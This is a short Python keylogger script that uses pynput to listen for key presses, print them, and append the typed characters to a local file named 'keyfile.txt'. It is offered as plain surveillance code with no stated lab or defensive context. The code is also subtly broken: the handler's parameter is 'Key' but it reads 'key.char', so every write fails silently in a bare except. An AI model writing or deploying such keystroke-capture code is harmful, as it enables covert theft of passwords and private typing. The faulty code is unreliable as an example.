from pynput import keyboard 
#this will help us to record the key strokes

def KeyPressed(Key):
    print(str(Key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")


if  __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()
